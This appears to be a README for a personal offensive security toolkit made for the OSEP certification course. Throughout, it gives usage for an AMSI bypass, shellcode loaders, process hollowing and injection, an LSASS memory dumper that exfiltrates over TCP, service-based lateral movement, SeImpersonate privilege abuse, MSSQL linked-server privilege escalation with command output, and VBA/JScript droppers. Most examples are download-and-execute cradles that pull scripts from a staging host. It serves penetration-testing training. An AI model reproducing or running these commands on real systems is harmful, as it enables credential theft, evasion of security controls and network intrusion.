### OSEP Tools

Simple collection of tools that i've made mainly for Offsec's OSEP course and exam



##### PowerShell

Powershell scripts:

1. `ad_enum.ps1` - Simple wrapper around PowerView to generate an AD Domain enumeration summary for a given domain

Example usage

```Powershell
## Disable AMSI
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/amsi.ps1")|IEX
## Load PowerView
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/PowerView.ps1")|IEX
## Load the wrapper
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/ad_enum.ps1")|IEX
## Invoke
Invoke-Enum -Domain example.com
```

2. `amsi.ps1` - Simple obfuscated AMSI bypasses based on few different techniques

3. `basic_loader.ps1` - Basic shellcode loader, mainly used for PE shellcode generated with donut

Example usage

```Powershell
## Generate the shellcode of a given PE
donut -i Rubeus.exe -p "triage" -x 2 -o loader.bin
## Invoke the loader after hosting the generated shellcode, at the moment the URL for the shellcode is hardcoded as i was lazy to change it
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/basic_loader.ps1")|IEX
```

4. `invoke_assembly.ps1` - Simple powershell script to dynamically invoke C# assemblies

Example usage

```powershell
## Host the given assembly and load the script
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/invoke_assembly.ps1")|IEX
## Invoke the assembly
Invoke-Assembly -Program http://pwndrop.local/Rubeus.exe -Arguments "triage"
```

5. `lsass_dumper.ps1` - LSASS process dumper that is using a tcp socket to exfiltrate the generated memory dumper

Example usage

```powershell
## Prepare a TCP listener, netcat or a simple python script
python receiver.py
## Load and invoke the script
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/lsass_dumper.ps1")|IEX
Invoke-Dump -Destination 192.168.49.70:12345
## The generated dump can then be parsed with mimikatz or pypykatz
```

6. `process_hollowing.ps1` - Simple process hollowing injection in powershell

Example usage

```powershell
## Load the script and invoke the injection
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/process_hollowing.ps1")|IEX
Invoke-Hollow -Shellcode http://pwndrop.local/sc.bin -Process "C:\Windows\System32\svchost.exe"
```

7. `scexec.ps1` - Powershell script for lateral movement based on the SCExec technique (Windows service manager)

Example usage

```powershell
## Change the required parameters
$target = "192.168.1.25"
$service = "SensorService"
$payload = "C:\windows\system32\cmd.exe /c powershell /c whoami"

## Execute the script 
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/scexec.ps1")|IEX
```

8. `spawn_and_inject.ps1` - Classic Spawn and inject shellcode runner

Example usage

```powershell
## Load the script and invoke
(New-Object System.net.WebClient).DownloadString("http://pwndrop.local/spawn_and_inject.ps1")|IEX
Invoke-Injection -Shellcode http://pwndrop.local/demon.bin -Process C:\Windows\System32\notepad.exe
```



##### CSharp

Csharp based tools:

1. `Dll_Dropper.cs` - Simple DLL based in csharp that can be used to inject shellcode or spawn powershell download cradle in a custom runspace, it depends on [DllExport](https://github.com/3F/DllExport)
It can be run with `rundll32.exe` or any other DLL loading method, there are two functions exported one for the injector (Inject) and one for powershell (PSRun)

2. `SEImpersonate.cs` - Custom tool to abuse the `SeImpersonatePrivilege` by creating a named pipe and impersonating the connected client. The tool expects two arguments: program to spawn and pipe to create. It was designed to be used with [SpoolSample.exe](https://github.com/leechristensen/SpoolSample), however any other coercion method should do

Example usage

```powershell
## Preapre the named pipe and specify what should be ran, it can be a loader, powershell download cradle or any other program
impersonate.exe C:\windows\system32\cmd.exe \\.\pipe\test\pipe\spoolss
## Run spool sample to coerce the host to connect to our named pipe
SpoolSample.exe WEB05 WEB05/pipe/test
```

3. `Service.cs` - Basic shellcode loader in the form of a windows service, mainly used for lateral movement with psexec or persistence

4. `SQL.cs` - Simple utility to abuse MSSQL integrated authenticaton, it can be used for enumeration, command execution and linked server abuse or ntlm relaying.

Example usage

```powershell
## Enumerate the current user access to the specified instance: privileges, linked servers, impersonation accounts etc..
sql.exe --host db05 --operation enum

## Execute OS commands through two methods:
## 1. standard xp_cmdshell
## 2. OLE object creation
sql.exe --host db05 --operation exec --cmd whoami
sql.exe --host db05 --operation exec-ole --cmd whoami

## Coerce the SQL server to authenticate against arbitrary share trough xp_dirtree, ntlm hash can be captured or the auth relayed
sql.exe --host db05 --operation dirtree --rhost 192.168.1.221

## Execute raw sql queries
sql.exe --host db05 --operation query --raw "SELECT SYSTEM_USER()"

## Linked servers and impersonation can also be used
sql.exe --host db05 --operation exec --cmd whoami --link db06 --as-user sa
sql.exe --host db05 --operation exec-ole --as-user sa
sql.exe --host db05 --operation exec-old --link db06

## Example traverse linked service for privilege escalation
SQL.exe --host db01 --operation query --raw "EXECUTE AS LOGIN = 'dev_int'; EXEC ('EXEC (''select SYSTEM_USER'') at DB01') AT DB02;"

## Enabling xp_cmdshell and executing commands trough link via raw query
sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''sp_configure ''''show advanced options'''', 1; reconfigure;'') AT DB01') AT DB02"
sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''sp_configure ''''xp_cmdshell'''', 1; reconfigure;'') AT DB01') AT DB02"
sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''xp_cmdshell ''''whoami'''';'') AT DB01') AT DB02"
[+] Authenticated
[+] Executing raw query
nt service\mssql$sqlexpress

## Privilege escalation by following links: db01 (regular user) -> db02 (sa user) -> db01 (sa user)
sql.exe --host db01 --as-user dev_int --operation query --raw "EXEC ('EXEC (''EXEC (''''SELECT SYSTEM_USER'''') AT DB02'') at DB01') AT DB02;"

## Getting command execution trough the same privilege escalation via sql links
*Evil-WinRM* PS C:\windows\tasks> ./sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''EXEC (''''sp_configure ''''''''show advanced options'''''''', 1; reconfigure;'''') AT DB02'') at DB01') AT DB02;"
[+] Authenticated
[+] Executing raw query

*Evil-WinRM* PS C:\windows\tasks> ./sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''EXEC (''''sp_configure ''''''''xp_cmdshell'''''''', 1; reconfigure;'''') AT DB02'') at DB01') AT DB02;"
[+] Authenticated
[+] Executing raw query

*Evil-WinRM* PS C:\windows\tasks> ./sql.exe --host db01.cowmotors-int.com --as-user dev_int --operation query --raw "EXEC ('EXEC (''EXEC (''''xp_cmdshell ''''''''whoami'''''''';'''') AT DB02'') at DB01') AT DB02;"
[+] Authenticated
[+] Executing raw query
nt service\mssql$sqlexpress
```


##### Initial access

Basic initial access tools

1. `dotnet_exec.js` - Modified version of a DotNetToJS Jscript script, all that it needs is a dotnet based assembly in base64 format (the one that DotNetToJs generates and embeds), however in this case instead of embedding it its download from a webserver

2. `dropper.js` - Simple JSCript dropper that is downloading two files and abusing the Microsoft workflow compiler, mainly used for AppLocker bypass.

3. `ps_dropper.vba` - Simple VBA macro that is executing an obfuscated powershell download cradle

4. `loader.vba` - Simple VBA macro that is fetching shellcode from a remote server and injects it in the word process, mainly used for initial access, keep in mind that you have to migrated to a more stable process after the initial compromise.

5. `source.txt`, `out.xml` - CSharp Spawn and Inject source code for usage with the Microsoft workflow compiler execution technique, out.xml is the XML required by the technique, the two files are hosted on a webserver and then the dropper.js can be send to the victim (or embedded in an HTA app)



##### Python

1. `Lateral.py` - Havoc extension that is used for powershell based lateral movement (WMI or WINRM). It can be used by explicitly supplying credentials or stealing a token.

